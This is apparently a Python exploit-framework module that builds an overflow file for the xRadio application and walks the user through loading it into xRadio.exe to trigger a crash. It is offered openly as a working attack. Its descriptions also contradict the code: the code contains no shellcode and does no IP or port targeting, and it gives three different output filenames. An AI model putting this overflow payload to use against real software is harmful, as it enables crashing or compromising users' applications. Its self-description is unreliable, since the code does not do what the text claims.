# payload aurthor: Mohammad
# Date: 9/18/21

"""
This payload use a buffer overflow
to excute shell code in python 
this is used for windows server
"""

from colorama import Fore, Style 
import time
import os

class Payload:

	config={
	}
	def show_options(self):
		print(Fore.YELLOW+"Options\t\tNecessity\t\tDefault"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------\t\t---------\t\t-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+"%s\t\t%s\t\t\t%s" % (
				key, int(self.config[key]["necessity"]), int(self.get_config(key)))+Style.RESET_ALL)
			

	@staticmethod
	def show_info():
		print(Fore.YELLOW+"\nThis exploit tries to do a buffer \noverflow to the given ip and port"+Style.RESET_ALL)

	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key]["default"] = value
		else:
			print("No options")
	
	
	def get_config(self, key):
		return self.config[key]["default"]

	@staticmethod
	def run():
		junk="A" * 1028
		random="MEMES"
		junk2="B" * 128

		punt="Ã¢G" * 30
		selo="//" * 60

		sel="&" * 120

		SavePayload=open("ksf.txt", '+a')
		SavePayload.write(junk+random+junk2+punt+selo+sel)
		SavePayload.close()
		#except:
		#	print("[-] Can't write payload in system ...")
		#	exit()

		time.sleep(1.5)
		print(Fore.BLUE+"[+]"+Style.RESET_ALL+"Generater file in m0lki.txt")
		time.sleep(1)
		print(Fore.BLUE+"[+]"+Style.RESET_ALL+"Always love exploits ;)")
		print("[+] b0t.xrl created.")
		print("[+] Open xRadio.exe...")
		print("[+] and Radios >> Edit List >> Save radio list")
		print("[+] Select the *.xrl file, press Yes and boom!!\n")
